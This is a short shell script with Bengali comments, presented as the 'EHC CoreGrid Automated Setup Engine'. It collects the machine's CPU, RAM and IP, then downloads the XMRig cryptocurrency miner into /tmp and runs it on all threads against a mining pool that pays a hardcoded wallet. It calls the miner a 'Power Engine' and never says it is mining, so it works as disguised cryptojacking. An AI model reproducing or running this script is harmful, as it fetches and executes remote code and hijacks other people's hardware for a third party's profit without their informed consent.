#!/bin/sh
clear
echo "=================================================="
echo "       EHC CoreGrid Automated Setup Engine        "
echo "=================================================="

# ১. ইউজারের কাছে ওয়ার্কার নাম চাওয়া
echo -n "Enter Worker Name for this PC (e.g. PC_Core2Duo_01): "
read WORKER_NAME

if [ -z "$WORKER_NAME" ]; then
    WORKER_NAME="EHC_Worker_$(date +%s)"
fi

# ২. পিসির হার্ডওয়্যার ইনফরমেশন সংগ্রহ করা
CPU_INFO=$(nproc)
RAM_INFO=$(free -m | awk '/Mem:/ { print $2 }')
IP_INFO=$(hostname -I | awk '{print $1}')

echo "--------------------------------------------------"
echo "System Profile Captured successfully:"
echo "-> Worker ID : $WORKER_NAME"
echo "-> CPU Cores : $CPU_INFO Threads"
echo "-> RAM Size  : ${RAM_INFO}MB"
echo "-> Local IP  : $IP_INFO"
echo "--------------------------------------------------"

# ৩. গিটহাব থেকে সরাসরি স্ট্যাটিক XMRig ডাউনলোড করা
echo "[+] Downloading EHC Power Engine..."
wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-static-x64.tar.gz -O /tmp/xmrig.tar.gz
tar -xf /tmp/xmrig.tar.gz -C /tmp/

echo "--------------------------------------------------"
echo "[+] EHC CoreGrid Engine is running at 100% Power..."
echo "[+] Wallet: 0xD6d0c99C1241A175f403d758280F71Ca5aBd2c92"
echo "--------------------------------------------------"

# ৪. আপনার ওয়ালেট এবং ডাইনামিক ওয়ার্কার নাম দিয়ে ইঞ্জিন ব্যাকগ্রাউন্ডে রান করা
/tmp/xmrig-6.21.0/xmrig -o rx.unmineable.com:3333 -u USDT:0xD6d0c99C1241A175f403d758280F71Ca5aBd2c92.$WORKER_NAME#referral -p x --threads=$CPU_INFO --huge-pages
